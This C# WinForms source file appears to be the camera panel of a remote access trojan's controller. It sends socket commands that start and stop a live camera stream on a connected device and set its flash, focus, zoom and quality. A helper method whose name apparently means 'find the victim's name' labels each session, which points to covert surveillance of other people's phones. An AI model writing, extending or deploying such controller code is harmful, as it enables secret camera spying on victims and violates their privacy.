using System;
using System.Drawing;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace SV
{
    public partial class Kamera : MetroFramework.Forms.MetroForm
    {
        Socket soketimiz;
        public string ID = "";
        public int max = 0;
        public int zoom = 0;
        public Form1.ClientSession infoAl;
        public Kamera(Socket s, string aydi)
        {
            soketimiz = s;
            ID = aydi;
            InitializeComponent();
            metroComboBox3.SelectedIndex = 3;
            metroComboBox4.SelectedIndex = 3;

        }
        public RotateFlipType rotateFlip = RotateFlipType.Rotate270FlipX;
        public Image RotateImage(Image img)
        {
            Bitmap bmp = new Bitmap(img);
            using (Graphics gfx = Graphics.FromImage(bmp))
            {
                gfx.Clear(Color.White);
                gfx.DrawImage(img, 0, 0, img.Width, img.Height);
            }

            bmp.RotateFlip(rotateFlip);
            return bmp;
        }
        public bool enabled = false;
        public bool zoomSupport = false;

        private static int lastTick;
        private static int lastFrameRate;
        private static int frameRate;

        public int CalculateFrameRate()
        {
            if (Environment.TickCount - lastTick >= 1000)
            {
                lastFrameRate = frameRate;
                frameRate = 0;
                lastTick = Environment.TickCount;
            }
            frameRate++;
            return lastFrameRate;
        }
        private void Kamera_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (metroButton3.Text == "Stop")
            {

                try
                {
                    byte[] senddata = Form1.MyDataPacker("LIVESTOP", Encoding.UTF8.GetBytes("ECHO"));
                    soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                }
                catch (Exception) { }
                if (infoAl != null)
                {
                    infoAl.CloseSocks();
                }
                System.Threading.Tasks.Task.Delay(200).Wait();
            }      
        }
        private void metroCheckBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (metroButton3.Text == "Stop")
            {
                if (metroCheckBox1.Checked)
                {
                    try
                    {
                        byte[] senddata = Form1.MyDataPacker("LIVEFLASH", Encoding.UTF8.GetBytes("1"));
                        soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                    }
                    catch (Exception) { }
                }
                else
                {
                    try
                    {
                        byte[] senddata = Form1.MyDataPacker("LIVEFLASH", Encoding.UTF8.GetBytes("0"));
                        soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                    }
                    catch (Exception) { }
                }
            }
        }

        private void metroComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (metroButton3.Text == "Stop")
            {
                if (!string.IsNullOrEmpty(metroComboBox1.SelectedItem.ToString()))
                {
                    try
                    {
                        byte[] senddata = Form1.MyDataPacker("QUALITY", Encoding.UTF8.GetBytes(metroComboBox1.SelectedItem.ToString().Replace("%", "")));
                        soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                    }
                    catch (Exception) { }
                }
            }
        }

        private void metroCheckBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (metroButton3.Text == "Stop")
            {
                if (metroCheckBox2.Checked)
                {
                    try
                    {
                        byte[] senddata = Form1.MyDataPacker("FOCUSELIVE", Encoding.UTF8.GetBytes("1"));
                        soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                    }
                    catch (Exception) { }
                }
                else
                {
                    try
                    {
                        byte[] senddata = Form1.MyDataPacker("FOCUSELIVE", Encoding.UTF8.GetBytes("0"));
                        soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                    }
                    catch (Exception) { }
                }
            }
        }

        private void metroComboBox4_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (metroComboBox4.SelectedIndex)
            {
                case 0:
                    pictureBox2.SizeMode = PictureBoxSizeMode.Normal;
                    break;
                case 1:
                    pictureBox2.SizeMode = PictureBoxSizeMode.StretchImage;
                    break;
                case 2:
                    pictureBox2.SizeMode = PictureBoxSizeMode.AutoSize;
                    break;
                case 3:
                    pictureBox2.SizeMode = PictureBoxSizeMode.Zoom;
                    break;
                case 4:
                    pictureBox2.SizeMode = PictureBoxSizeMode.CenterImage;
                    break;
            }
        }

        private void metroComboBox3_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (metroComboBox3.SelectedIndex)
            {
                case 0:
                    rotateFlip = RotateFlipType.Rotate270FlipNone;
                    break;
                case 1:
                    rotateFlip = RotateFlipType.Rotate180FlipX;
                    break;
                case 2:
                    rotateFlip = RotateFlipType.Rotate180FlipY;
                    break;
                case 3:
                    rotateFlip = RotateFlipType.Rotate90FlipNone;
                    break;
            }
        }

        private void metroButton1_Click(object sender, EventArgs e)
        {
            if (zoomSupport)
            {
                if (zoom < max)
                {
                    try
                    {                
                        if (metroButton3.Text == "Stop")
                        {
                            zoom += 1;
                            byte[] senddata = Form1.MyDataPacker("ZOOM", Encoding.UTF8.GetBytes(zoom.ToString()));
                            soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                        }
                        metroLabel1.Text = "Zoom: x" + zoom.ToString();
                    }
                    catch (Exception) { }
                }
            }
        }

        private void metroButton2_Click(object sender, EventArgs e)
        {
            if (zoomSupport)
            {
                if (zoom > 0)
                {
                    try
                    {                       
                        if (metroButton3.Text == "Stop")
                        {
                            zoom -= 1;
                            byte[] senddata = Form1.MyDataPacker("ZOOM", Encoding.UTF8.GetBytes(zoom.ToString()));
                            soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                        }
                        metroLabel1.Text = "Zoom: x" + zoom.ToString();
                    }
                    catch (Exception) { }
                }
            }
        }

        private void metroButton3_Click(object sender, EventArgs e)
        {
            if (enabled == false)
            {
                if (!string.IsNullOrEmpty(metroComboBox5.SelectedItem.ToString()))
                {                   
                    label1.Visible = false;
                    string cam = "";
                    string flashmode = "";
                    string resolution = "";
                    string focus = metroCheckBox2.Checked ? "1" : "0";
                    cam = metroComboBox5.SelectedItem.ToString().Replace("Front: ", "").Replace("Back: ", "").Replace("Unknown: ", "");  // 1 ön kamera
                    flashmode = metroCheckBox1.Checked ? "1" : "0";
                    label1.Visible = false;
                    resolution = metroComboBox2.SelectedItem.ToString();
                    try
                    {
                        byte[] senddata = Form1.MyDataPacker("LIVESTREAM", Encoding.UTF8.GetBytes("[VERI]" + cam + "[VERI]" + flashmode + "[VERI]" + resolution + "[VERI]" + metroComboBox1.SelectedItem.ToString().Replace("%", "") +
                      "[VERI]" + focus));
                        soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                        Text = "Camera Manager - " + ((Form1)Application.OpenForms["Form1"]).krbnIsminiBul(soketimiz.Handle.ToString());
                        metroButton3.Text = "Stop";
                        enabled = true;
                    }
                    catch (Exception) { }
                }
                else
                {
                    MessageBox.Show("Please select a camera", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    return;
                }
            }
            else
            {
                metroButton3.Enabled = false; metroButton3.Text = "Wait..";
                try
                {
                    byte[] senddata = Form1.MyDataPacker("LIVESTOP", Encoding.UTF8.GetBytes("ECHO"));
                    soketimiz.Send(senddata, 0, senddata.Length, SocketFlags.None);
                }
                catch (Exception) { }
                if (infoAl != null)
                {

                    infoAl.CloseSocks();
                }
            }
        }
    }
}